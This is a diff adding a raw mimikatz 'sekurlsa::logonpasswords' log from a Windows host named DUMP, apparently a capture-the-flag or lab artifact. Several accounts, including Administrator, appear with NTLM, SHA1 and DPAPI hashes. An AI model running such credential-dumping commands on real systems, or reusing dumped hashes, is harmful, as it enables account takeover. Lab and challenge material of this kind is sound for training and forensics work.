@@ -1,0 +1,839 @@
+﻿.#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+mimikatz # sekurlsa::logonpasswords
+
+
+Authentication Id : 0 ; 5056238 (00000000:004d26ee)
+Session           : Interactive from 9
+User Name         : DWM-9
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/3/2025 8:48:25 PM
+SID               : S-1-5-90-0-9
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DUMP$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+
+Authentication Id : 0 ; 5056204 (00000000:004d26cc)
+Session           : Interactive from 9
+User Name         : DWM-9
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/3/2025 8:48:25 PM
+SID               : S-1-5-90-0-9
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DUMP$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+
+Authentication Id : 0 ; 4020561 (00000000:003d5951)
+Session           : Interactive from 8
+User Name         : UMFD-8
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 3/3/2025 8:47:58 PM
+SID               : S-1-5-96-0-8
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DUMP$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+
+Authentication Id : 0 ; 3423777 (00000000:00343e21)
+Session           : Interactive from 7
+User Name         : DWM-7
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/3/2025 8:47:46 PM
+SID               : S-1-5-90-0-7
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DUMP$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+
+Authentication Id : 0 ; 3422333 (00000000:0034387d)
+Session           : Interactive from 7
+User Name         : UMFD-7
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 3/3/2025 8:47:46 PM
+SID               : S-1-5-96-0-7
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DUMP$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+
+
+
+
+       credman :
+
+
+Authentication Id : 0 ; 2988284 (00000000:002d98fc)
+Session           : RemoteInteractive from 6
+User Name         : ByteReaper
+Domain            : DUMP
+Logon Server      : DUMP
+Logon Time        : 3/3/2025 8:47:33 PM
+SID               : S-1-5-21-1966530601-3185510712-10604624-1010
+        msv :
+         [00000003] Primary
+         * Username : ByteReaper
+         * Domain   : DUMP
+         * NTLM     : 43034346035d7a24b1eaa1c82acaef3e
+         * SHA1     : f3b540c9d2f6d4167d4547231518ea1e177f1ef3
+         * DPAPI    : f3b540c9d2f6d4167d4547231518ea1e
+        tspkg :
+        wdigest :
+         * Username : ByteReaper
+         * Domain   : DUMP
+         * Password : (null)
+        kerberos :
+         * Username : ByteReaper
+         * Domain   : DUMP
+         * Password : (null)
+        ssp :
+        credman :
+
+
+Authentication Id : 0 ; 2977376 (00000000:002d6e60)
+Session           : Interactive from 6
+User Name         : DWM-6
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/3/2025 8:47:33 PM
+SID               : S-1-5-90-0-6
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DUMP$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+
+Authentication Id : 0 ; 2975990 (00000000:002d68f6)
+Session           : Interactive from 6
+User Name         : UMFD-6
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 3/3/2025 8:47:33 PM
+SID               : S-1-5-96-0-6
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DUMP$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+
+Authentication Id : 0 ; 2639338 (00000000:002845ea)
+Session           : RemoteInteractive from 5
+User Name         : NullPhantom
+Domain            : DUMP
+Logon Server      : DUMP
+Logon Time        : 3/3/2025 8:47:19 PM
+SID               : S-1-5-21-1966530601-3185510712-10604624-1011
+        msv :
+         [00000003] Primary
+         * Username : NullPhantom
+         * Domain   : DUMP
+         * NTLM     : 75b216fc8d12fbd0124d0c0865118e4d
+         * SHA1     : 5fd4a13af67509c2767224bb1af6644f3f7ed6d4
+         * DPAPI    : 5fd4a13af67509c2767224bb1af6644f
+        tspkg :
+        wdigest :
+         * Username : NullPhantom
+         * Domain   : DUMP
+         * Password : (null)
+        kerberos :
+         * Username : NullPhantom
+         * Domain   : DUMP
+         * Password : (null)
+        ssp :
+        credman :
+
+
+Authentication Id : 0 ; 2629201 (00000000:00281e51)
+Session           : Interactive from 5
+User Name         : DWM-5
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/3/2025 8:47:19 PM
+SID               : S-1-5-90-0-5
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DUMP$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+
+Authentication Id : 0 ; 1918110 (00000000:001d449e)
+Session           : RemoteInteractive from 4
+User Name         : specter
+Domain            : DUMP
+Logon Server      : DUMP
+Logon Time        : 3/3/2025 8:44:47 PM
+SID               : S-1-5-21-1966530601-3185510712-10604624-1008
+        msv :
+         [00000003] Primary
+         * Username : specter
+         * Domain   : DUMP
+         * NTLM     : 2c3e48bac1b65c52fc0fb0cd70eaf3aa
+         * SHA1     : 18daa8d22e0c63318e349c84f02ccde9f4703faa
+         * DPAPI    : 18daa8d22e0c63318e349c84f02ccde9
+        tspkg :
+        wdigest :
+         * Username : specter
+         * Domain   : DUMP
+         * Password : (null)
+        kerberos :
+         * Username : specter
+         * Domain   : DUMP
+         * Password : (null)
+        ssp :
+        credman :
+
+
+Authentication Id : 0 ; 1906796 (00000000:001d186c)
+Session           : Interactive from 4
+User Name         : UMFD-4
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 3/3/2025 8:44:46 PM
+SID               : S-1-5-96-0-4
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DUMP$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+
+Authentication Id : 0 ; 996167 (00000000:000f3347)
+Session           : RemoteInteractive from 3
+User Name         : Cipher
+Domain            : DUMP
+Logon Server      : DUMP
+Logon Time        : 3/3/2025 8:35:17 PM
+SID               : S-1-5-21-1966530601-3185510712-10604624-1009
+        msv :
+         [00000003] Primary
+         * Username : Cipher
+         * Domain   : DUMP
+         * NTLM     : 6786c31df90f9568d4ca2480affeea9a
+         * SHA1     : a326d034836aa5ae571910a8ffe0d8b94a1a9f21
+         * DPAPI    : a326d034836aa5ae571910a8ffe0d8b9
+        tspkg :
+        wdigest :
+         * Username : Cipher
+         * Domain   : DUMP
+         * Password : (null)
+        kerberos :
+         * Username : Cipher
+         * Domain   : DUMP
+         * Password : (null)
+        ssp :
+        credman :
+
+
+Authentication Id : 0 ; 381688 (00000000:0005d2f8)
+Session           : RemoteInteractive from 2
+User Name         : Administrator
+Domain            : DUMP
+Logon Server      : DUMP
+Logon Time        : 3/3/2025 7:43:44 PM
+SID               : S-1-5-21-1966530601-3185510712-10604624-500
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : DUMP
+         * NTLM     : 2dfe3378335d43f9764e581b856a662a
+         * SHA1     : 6529ad96db96f0332eb6ab3d912923d55f34b947
+         * DPAPI    : 6529ad96db96f0332eb6ab3d912923d5
+        tspkg :
+        wdigest :
+         * Username : Administrator
+         * Domain   : DUMP
+         * Password : (null)
+        kerberos :
+         * Username : Administrator
+         * Domain   : DUMP
+         * Password : (null)
+        ssp :
+        credman :
+
+
+Authentication Id : 0 ; 351053 (00000000:00055b4d)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 3/3/2025 7:43:43 PM
+SID               : S-1-5-96-0-2
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DUMP$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : DUMP$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 3/3/2025 7:38:49 PM
+SID               : S-1-5-20
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DUMP$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+         * Username : dump$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        ssp :
+        credman :
+
+
+Authentication Id : 0 ; 25872 (00000000:00006510)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 3/3/2025 7:38:49 PM
+SID               : S-1-5-96-0-1
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DUMP$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+
+Authentication Id : 0 ; 25841 (00000000:000064f1)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 3/3/2025 7:38:49 PM
+SID               : S-1-5-96-0-0
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DUMP$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+
+Authentication Id : 0 ; 5073537 (00000000:004d6a81)
+Session           : RemoteInteractive from 9
+User Name         : ShadowPacket
+Domain            : DUMP
+Logon Server      : DUMP
+Logon Time        : 3/3/2025 8:48:25 PM
+SID               : S-1-5-21-1966530601-3185510712-10604624-1014
+        msv :
+         [00000003] Primary
+         * Username : ShadowPacket
+         * Domain   : DUMP
+         * NTLM     : 5fe2eb8c75c48179bce6025e70859e47
+         * SHA1     : a9251b4d13ca76d70a6f32c503b85a4a29bb5ab5
+         * DPAPI    : a9251b4d13ca76d70a6f32c503b85a4a
+        tspkg :
+        wdigest :
+         * Username : ShadowPacket
+         * Domain   : DUMP
+         * Password : (null)
+        kerberos :
+         * Username : ShadowPacket
+         * Domain   : DUMP
+         * Password : (null)
+        ssp :
+        credman :
+
+
+Authentication Id : 0 ; 5054852 (00000000:004d2184)
+Session           : Interactive from 9
+User Name         : UMFD-9
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 3/3/2025 8:48:25 PM
+SID               : S-1-5-96-0-9
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DUMP$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+
+Authentication Id : 0 ; 4041327 (00000000:003daa6f)
+Session           : RemoteInteractive from 8
+User Name         : GhostTrace
+Domain            : DUMP
+Logon Server      : DUMP
+Logon Time        : 3/3/2025 8:47:59 PM
+SID               : S-1-5-21-1966530601-3185510712-10604624-1013
+        msv :
+         [00000003] Primary
+         * Username : GhostTrace
+         * Domain   : DUMP
+         * NTLM     : 4820e4687d0ed2845328aa492dc0b33c
+         * SHA1     : 4bb51376ce7cc228e124dad2eeb9b8d62db1844f
+         * DPAPI    : 4bb51376ce7cc228e124dad2eeb9b8d6
+        tspkg :
+        wdigest :
+         * Username : GhostTrace
+         * Domain   : DUMP
+         * Password : (null)
+        kerberos :
+         * Username : GhostTrace
+         * Domain   : DUMP
+         * Password : (null)
+        ssp :
+        credman :
+
+
+Authentication Id : 0 ; 4021983 (00000000:003d5edf)
+Session           : Interactive from 8
+User Name         : DWM-8
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/3/2025 8:47:58 PM
+SID               : S-1-5-90-0-8
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DUMP$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+
+Authentication Id : 0 ; 4021919 (00000000:003d5e9f)
+Session           : Interactive from 8
+User Name         : DWM-8
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/3/2025 8:47:58 PM
+SID               : S-1-5-90-0-8
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DUMP$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+
+Authentication Id : 0 ; 3435190 (00000000:00346ab6)
+Session           : RemoteInteractive from 7
+User Name         : DarkInjector
+Domain            : DUMP
+Logon Server      : DUMP
+Logon Time        : 3/3/2025 8:47:46 PM
+SID               : S-1-5-21-1966530601-3185510712-10604624-1012
+        msv :
+         [00000003] Primary
+         * Username : DarkInjector
+         * Domain   : DUMP
+         * NTLM     : 3a659a65d9c16d40a28684995782458f
+         * SHA1     : 76896bc65bdf920328a5fba3bcc67fb8c42b6252
+         * DPAPI    : 76896bc65bdf920328a5fba3bcc67fb8
+        tspkg :
+        wdigest :
+         * Username : DarkInjector
+         * Domain   : DUMP
+         * Password : (null)
+        kerberos :
+         * Username : DarkInjector
+         * Domain   : DUMP
+         * Password : (null)
+        ssp :
+        credman :
+
+
+Authentication Id : 0 ; 3423671 (00000000:00343db7)
+Session           : Interactive from 7
+User Name         : DWM-7
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/3/2025 8:47:46 PM
+SID               : S-1-5-90-0-7
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DUMP$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+
+Authentication Id : 0 ; 2977722 (00000000:002d6fba)
+Session           : Interactive from 6
+User Name         : DWM-6
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/3/2025 8:47:33 PM
+SID               : S-1-5-90-0-6
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DUMP$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+
+Authentication Id : 0 ; 2629031 (00000000:00281da7)
+Session           : Interactive from 5
+User Name         : DWM-5
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/3/2025 8:47:19 PM
+SID               : S-1-5-90-0-5
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DUMP$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+
+Authentication Id : 0 ; 2627648 (00000000:00281840)
+Session           : Interactive from 5
+User Name         : UMFD-5
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 3/3/2025 8:47:19 PM
+SID               : S-1-5-96-0-5
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DUMP$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+
+Authentication Id : 0 ; 1908066 (00000000:001d1d62)
+Session           : Interactive from 4
+User Name         : DWM-4
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/3/2025 8:44:46 PM
+SID               : S-1-5-90-0-4
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DUMP$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+
+Authentication Id : 0 ; 1908042 (00000000:001d1d4a)
+Session           : Interactive from 4
+User Name         : DWM-4
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/3/2025 8:44:46 PM
+SID               : S-1-5-90-0-4
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DUMP$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+
+Authentication Id : 0 ; 996138 (00000000:000f332a)
+Session           : RemoteInteractive from 3
+User Name         : Cipher
+Domain            : DUMP
+Logon Server      : DUMP
+Logon Time        : 3/3/2025 8:35:17 PM
+SID               : S-1-5-21-1966530601-3185510712-10604624-1009
+        msv :
+         [00000003] Primary
+         * Username : Cipher
+         * Domain   : DUMP
+         * NTLM     : 6786c31df90f9568d4ca2480affeea9a
+         * SHA1     : a326d034836aa5ae571910a8ffe0d8b94a1a9f21
+         * DPAPI    : a326d034836aa5ae571910a8ffe0d8b9
+        tspkg :
+        wdigest :
+         * Username : Cipher
+         * Domain   : DUMP
+         * Password : (null)
+        kerberos :
+         * Username : Cipher
+         * Domain   : DUMP
+         * Password : (null)
+        ssp :
+        credman :
+
+
+Authentication Id : 0 ; 986542 (00000000:000f0dae)
+Session           : Interactive from 3
+User Name         : DWM-3
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/3/2025 8:35:16 PM
+SID               : S-1-5-90-0-3
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DUMP$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+
+Authentication Id : 0 ; 986506 (00000000:000f0d8a)
+Session           : Interactive from 3
+User Name         : DWM-3
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/3/2025 8:35:16 PM
+SID               : S-1-5-90-0-3
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DUMP$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+
+Authentication Id : 0 ; 985141 (00000000:000f0835)
+Session           : Interactive from 3
+User Name         : UMFD-3
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 3/3/2025 8:35:16 PM
+SID               : S-1-5-96-0-3
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DUMP$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+
+Authentication Id : 0 ; 352793 (00000000:00056219)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/3/2025 7:43:43 PM
+SID               : S-1-5-90-0-2
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DUMP$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+
+Authentication Id : 0 ; 352399 (00000000:0005608f)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/3/2025 7:43:43 PM
+SID               : S-1-5-90-0-2
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DUMP$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+
+Authentication Id : 0 ; 46499 (00000000:0000b5a3)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/3/2025 7:38:49 PM
+SID               : S-1-5-90-0-1
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DUMP$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+
+Authentication Id : 0 ; 46465 (00000000:0000b581)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/3/2025 7:38:49 PM
+SID               : S-1-5-90-0-1
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DUMP$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 3/3/2025 7:38:49 PM
+SID               : S-1-5-19
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        ssp :
+        credman :
+
+
+Authentication Id : 0 ; 24702 (00000000:0000607e)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 3/3/2025 7:38:48 PM
+SID               :
+        msv :
+        tspkg :
+        wdigest :
+        kerberos :
+        ssp :
+        credman :
+
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : DUMP$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 3/3/2025 7:38:48 PM
+SID               : S-1-5-18
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DUMP$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+         * Username : dump$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        ssp :
+        credman :
+
+
+mimikatz #
